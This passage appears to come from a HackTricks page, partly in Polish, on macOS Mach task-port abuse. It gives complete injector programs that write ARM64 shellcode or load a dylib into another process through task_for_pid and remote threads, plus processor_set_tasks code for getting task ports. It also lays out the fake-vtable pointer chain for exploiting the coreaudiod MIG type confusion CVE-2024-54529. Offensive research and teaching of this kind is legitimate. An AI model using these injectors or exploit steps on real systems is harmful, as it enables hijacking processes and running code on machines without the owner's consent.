<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Compile** poprzedni program i dodaj **entitlements**, aby móc wstrzykiwać kod jako tego samego użytkownika (w przeciwnym razie będziesz musiał użyć **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Aby to działało na iOS, potrzebujesz uprawnienia `dynamic-codesigning`, aby móc ustawić pamięć zapisywalną jako wykonalną.

### Dylib Injection w wątku przez Task port

W macOS **wątki** mogą być manipulowane za pomocą **Mach** lub przy użyciu **posix `pthread` api**. Wątek, który wygenerowaliśmy w poprzedniej injekcji, został utworzony za pomocą Mach api, więc **nie jest zgodny z posix**.

Było możliwe **wstrzyknięcie prostego shellcode** do wykonania polecenia, ponieważ **nie musiał działać z posix** zgodnymi API, tylko z Mach. **Bardziej złożone injekcje** wymagałyby, aby **wątek** był również **zgodny z posix**.

Zatem, żeby **udoskonalić wątek**, powinien on wywołać **`pthread_create_from_mach_thread`**, które **utworzy poprawny pthread**. Potem ten nowy pthread mógłby **wywołać dlopen**, aby **załadować dylib** z systemu, więc zamiast pisać nowy shellcode do wykonania różnych akcji, można ładować niestandardowe biblioteki.

Możesz znaleźć **przykładowe dyliby** (na przykład taki, który generuje log, który potem można odczytać):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

W tej technice porywany jest wątek procesu:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

Wywołanie `task_for_pid` lub `thread_create_*` zwiększa licznik w strukturze task w jądrze, do którego można uzyskać dostęp z trybu użytkownika wywołując task_info(task, TASK_EXTMOD_INFO, ...)

## Exception Ports

Kiedy w wątku wystąpi wyjątek, jest on wysyłany do wyznaczonego exception port tego wątku. Jeśli wątek go nie obsłuży, trafia do task exception ports. Jeśli task też go nie obsłuży, jest wysyłany do host portu zarządzanego przez launchd (gdzie zostanie potwierdzony). To nazywa się exception triage.

Zauważ, że ostatecznie, jeśli wyjątek nie zostanie poprawnie obsłużony, raport zwykle trafi do demona ReportCrash. Jednak możliwe jest, że inny wątek w tym samym zadaniu obsłuży wyjątek — tak robią narzędzia do raportowania awarii, takie jak `PLCreashReporter`.

## Other Objects

### Clock

Każdy użytkownik może uzyskać informacje o zegarze, jednak aby ustawić czas lub zmodyfikować inne ustawienia, trzeba być rootem.

Aby pobrać informacje, można wywołać funkcje z subsystemu `clock`, takie jak: `clock_get_time`, `clock_get_attributtes` lub `clock_alarm`.  
Aby zmodyfikować wartości można użyć subsystemu `clock_priv` z funkcjami takimi jak `clock_set_time` i `clock_set_attributes`.

### Processors and Processor Set

API procesora pozwala kontrolować pojedynczy logiczny procesor, wywołując funkcje takie jak `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Co więcej, API **processor set** udostępnia sposób grupowania wielu procesorów. Można pobrać domyślny processor set wywołując **`processor_set_default`**.  
Oto niektóre interesujące API do interakcji z processor set:

- `processor_set_statistics`
- `processor_set_tasks`: Zwraca tablicę send rights do wszystkich tasków wewnątrz processor set
- `processor_set_threads`: Zwraca tablicę send rights do wszystkich wątków wewnątrz processor set
- `processor_set_stack_usage`
- `processor_set_info`

Jak wspomniano w [**this post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), w przeszłości pozwalało to obejść wcześniej wspomniane zabezpieczenie i uzyskać task porty w innych procesach, aby je kontrolować przez wywołanie **`processor_set_tasks`** i otrzymanie host portu w każdym procesie.  
Obecnie do użycia tej funkcji potrzebny jest root i jest ona chroniona, więc będziesz w stanie otrzymać te porty tylko w niechronionych procesach.

You can try it with:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirect call through vtable slot
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
{{#include ../../../../banners/hacktricks-training.md}}
